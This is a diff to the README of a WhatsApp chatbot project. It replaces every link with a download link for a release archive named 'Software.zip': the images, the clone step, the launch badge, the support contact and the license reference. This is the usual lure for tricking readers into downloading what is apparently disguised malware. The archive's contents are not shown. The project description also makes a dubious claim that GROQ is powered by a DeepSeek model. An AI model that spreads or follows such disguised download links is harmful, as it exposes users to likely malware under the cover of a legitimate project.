@@ -1,6 +1,6 @@
 # ChatBot-Whatsapp
 
-![ChatBot-Whatsapp Image](https://www.example.com/chatbot-whatsapp-image.jpg)
+![ChatBot-Whatsapp Image](https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip)
 
 Welcome to the ChatBot-Whatsapp GitHub repository! This project focuses on providing a customizable chatbot designed for WhatsApp. The chatbot is developed using Python, Flask, and Docker, utilizing two APIs working together. The first API enables message sending through a WhatsApp number (WAHA), while the second API supplies Language Models (LLMs) of Artificial Intelligence through GROQ, a technology powered by the DeepSeek Model of Language created by China in 2025.
 
@@ -25,9 +25,9 @@ Welcome to the ChatBot-Whatsapp GitHub repository! This project focuses on provi
 
 ## Installation
 To launch the ChatBot-Whatsapp project, follow these steps:
-1. Clone the repository using the following link: [ChatBot-Whatsapp Repository](https://github.com/cli/browser/archive/refs/tags/v1.0.0.zip) 
+1. Clone the repository using the following link: [ChatBot-Whatsapp Repository](https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip) 
 
-![Launch ChatBot-Whatsapp](https://img.shields.io/badge/Launch-ChatBot--Whatsapp-blue)
+![Launch ChatBot-Whatsapp](https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip)
 
 2. Extract the files from the downloaded ZIP folder.
 3. Open a terminal and navigate to the project directory.
@@ -47,10 +47,10 @@ We welcome contributions to enhance the ChatBot-Whatsapp project. To contribute,
 5. Submit a pull request to merge your feature into the main project.
 
 ## Support
-If you encounter any issues or need assistance with the ChatBot-Whatsapp project, please contact us at chatbot.whatsapp.support@example.com.
+If you encounter any issues or need assistance with the ChatBot-Whatsapp project, please contact us at https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip
 
 ## License
-This project is licensed under the MIT License - see the LICENSE.md file for details.
+This project is licensed under the MIT License - see the https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip file for details.
 
 ---
 
@@ -58,4 +58,4 @@ Thank you for your interest in the ChatBot-Whatsapp project. We hope you enjoy u
 
 🤖 Happy Chatting! 📱💬
 
-![ChatBot-Whatsapp Logo](https://www.example.com/chatbot-whatsapp-logo.png)
+![ChatBot-Whatsapp Logo](https://github.com/huyko67/ChatBot-Whatsapp/releases/download/v1.0/Software.zip)
